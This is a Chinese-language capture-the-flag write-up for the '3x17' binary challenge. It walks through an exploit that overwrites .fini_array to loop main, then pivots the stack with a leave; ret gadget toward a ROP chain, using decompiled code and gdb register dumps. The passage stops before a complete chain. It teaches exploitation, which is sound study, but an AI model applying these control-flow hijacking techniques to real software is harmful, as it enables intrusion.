# 3x17
先透過找 .rodata 中的 "addr:" 字串去找到 main 的位置

透過 reverse 和 gdb 可以轉換為

```
__int64 __fastcall sub_401B6D(__int64 a1, char *a2, __int64 a3)
{
  __int64 result; // rax
  char *v4; // ST08_8
  char buf; // [rsp+10h] [rbp-20h]
  unsigned __int64 v6; // [rsp+28h] [rbp-8h]

  v6 = __readfsqword(0x28u);
  result = (unsigned __int8)++byte_4B9330;
  if ( byte_4B9330 == 1 )
  {
    write(1u, "addr:", 5uLL);
    read(0, &buf, 0x18uLL);
    v4 = (char *)(signed int)string_to_int(&buf, &buf);
    write(1u, "data:", 5uLL);
    read(0, v4, 0x18uLL);
    result = 0LL;
  }
  if ( __readfsqword(0x28u) != v6 )
    sub_44A3E0();
  return result;
}
```
其中 string_to_int 可以透過 gdb 發現輸入 123 會變成 0x4d2，之後會對 0x4d2 做 write，因此我們要修改任何一次的位置來去達到 rce = =

而 stack 位置會因為 aslr 的緣故會變動。
去看這篇[文章](https://b0ldfrev.gitbook.io/note/pwn/zhong-xie-.finiarray-han-shu-zhi-zhen)有提到可以去修改 .fini_array 讓程式結束時可以跳到我們想要跳到的地方。

 main ----->  __libc_csu_fini  ------>  .fini_array[1] ------->   .fini_array[0]    
 
```
(base) yuan@yuan-All-Series:~/Downloads$ objdump -h 3x17
 14 .init_array   00000010  00000000004b40e0  00000000004b40e0  000b30e0  2**3
                  CONTENTS, ALLOC, LOAD, DATA
 15 .fini_array   00000010  00000000004b40f0  00000000004b40f0  000b30f0  2**3
                  CONTENTS, ALLOC, LOAD, DATA
 16 .data.rel.ro  00002df4  00000000004b4100  00000000004b4100  000b3100  2**5
                  CONTENTS, ALLOC, LOAD, DATA

```
去看 gdb 發現有兩個位置
```
gdb-peda$ x/20gx 0x0000000004b40f0
0x4b40f0:	0x0000000000401b00	0x0000000000401580
```
由於 .fini_array 是從由後往前呼叫，嘗試去修改 0x4b40f8，然而因為 byte_4B9330 在 bss 段，如果每次執行都會 + 1，跳第2次則不會跳到 read 中。

用 ida 去看 libc_start
```
public start
start proc near
; __unwind {
xor     ebp, ebp
mov     r9, rdx
pop     rsi
mov     rdx, rsp
and     rsp, 0FFFFFFFFFFFFFFF0h
push    rax
push    rsp
mov     r8, offset sub_402960
mov     rcx, offset loc_4028D0
mov     rdi, offset sub_401B6D
db      67h
call    sub_401EB0
hlt
; } // starts at 401A50
start endp

```
每個記憶體的[對照](https://www.jianshu.com/p/c4f081d9f32d)
```
main:       %rdi <-- sub_401B6D
argc:       %rsi <-- [RSP]
argv:       %rdx <-- [RSP + 0x8]
init:       %rcx <-- loc_4028D0
fini:       %r8  <-- sub_402960
rtld_fini:  %r9 <-- rdx on entry
stack_end:  stack <-- rsp
```
因此把 `.fini_array[1]` 改成 main，`.fini_array[0]` 改成 fini，這樣程式會一直無限循環直到 byte_4B9330 overflow 成 1 就能執行到 read/write。
這樣程式執行流程大致上長這樣

main -> .fini -> `.fini_array[1](main)` -> `.fini_array[0](.fini)` -> `.fini_array[1](main)` .......無限循環

在 `__libc_csu_fini` 可以看到 
```
lea    rbp,[rip+0xb1781]        # 0x4b40f0
call    qword ptr [rbp+rbx*8+0]
```
call 是呼叫 .fini.array 中，因此 call 這邊是我們可以控的
在 .fini 會從 `0x402988:	call   QWORD PTR [rbp+rbx*8+0x0]`
跳到我們給的
```
0x401c4b:	leave  
0x401c4c:	ret
```
執行完 leave
```
[----------------------------------registers-----------------------------------]
RAX: 0x0 
RBX: 0x0 
RCX: 0x1 
RDX: 0x402960 (push   rbp)
RSI: 0x0 
RDI: 0x0 
RBP: 0x401c4b (leave)
RSP: 0x4b40f8 --> 0x401580 (mov    rax,QWORD PTR [rip+0xb8b11]        # 0x4ba098)
RIP: 0x401c4c (ret)
R8 : 0x7ffd5be7a1f7 --> 0x4b701800 
R9 : 0x0 
R10: 0x495740 --> 0x100000000 
R11: 0x246 
R12: 0x4b7100 --> 0x4b98e0 --> 0x0 
R13: 0x1 
R14: 0x4b98e0 --> 0x0 
R15: 0x1
EFLAGS: 0x213 (CARRY parity ADJUST zero sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x401c44:	je     0x401c4b
   0x401c46:	call   0x44a3e0
   0x401c4b:	leave  
=> 0x401c4c:	ret    
   0x401c4d:	nop    DWORD PTR [rax]
   0x401c50:	push   rbx
   0x401c51:	sub    rsp,0x88
   0x401c58:	test   rdi,rdi
[------------------------------------stack-------------------------------------]
0000| 0x4b40f8 --> 0x401580 (mov    rax,QWORD PTR [rip+0xb8b11]        # 0x4ba098)
0008| 0x4b4100 --> 0xd00000002 
0016| 0x4b4108 --> 0x48f7e0 --> 0x0 
0024| 0x4b4110 --> 0x48f7c0 --> 0x100000000 
0032| 0x4b4118 --> 0x0 
0040| 0x4b4120 --> 0x4b6460 --> 0x0 
0048| 0x4b4128 --> 0x1 
0056| 0x4b4130 --> 0x4b63e0 --> 0x0 
[------------------------------------------------------------------------------]

```
執行完 ret
```
[----------------------------------registers-----------------------------------]
RAX: 0x0 
RBX: 0x0 
RCX: 0x1 
RDX: 0x402960 (push   rbp)
RSI: 0x0 
RDI: 0x0 
RBP: 0x401c4b (leave)
RSP: 0x4b4100 --> 0xd00000002 
RIP: 0x401580 (mov    rax,QWORD PTR [rip+0xb8b11]        # 0x4ba098)
R8 : 0x7ffd5be7a1f7 --> 0x4b701800 
R9 : 0x0 
R10: 0x495740 --> 0x100000000 
R11: 0x246 
R12: 0x4b7100 --> 0x4b98e0 --> 0x0 
R13: 0x1 
R14: 0x4b98e0 --> 0x0 
R15: 0x1
EFLAGS: 0x213 (CARRY parity ADJUST zero sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x401570:	call   0x4010e4
   0x401575:	call   0x4010e4
   0x40157a:	nop    WORD PTR [rax+rax*1+0x0]
=> 0x401580:	mov    rax,QWORD PTR [rip+0xb8b11]        # 0x4ba098
   0x401587:	test   rax,rax
   0x40158a:	je     0x4015a7
   0x40158c:	mov    ecx,0xe
   0x401591:	lea    rdi,[rip+0xa5e34]        # 0x4a73cc
[------------------------------------stack-------------------------------------]
0000| 0x4b4100 --> 0xd00000002 
0008| 0x4b4108 --> 0x48f7e0 --> 0x0 
0016| 0x4b4110 --> 0x48f7c0 --> 0x100000000 
0024| 0x4b4118 --> 0x0 
0032| 0x4b4120 --> 0x4b6460 --> 0x0 
0040| 0x4b4128 --> 0x1 
0048| 0x4b4130 --> 0x4b63e0 --> 0x0 
0056| 0x4b4138 --> 0x1 
[------------------------------------------------------------------------------]

```
可以看到他跳到 0x401580 (因為 0x4b40f8 中放 這個位置)，而 rsp 被移到 0x4b100

最後會跳到 ret ，所以會跳到 0x4b4100 位置上，因此可以在 0x4b4100 上放 rop chain
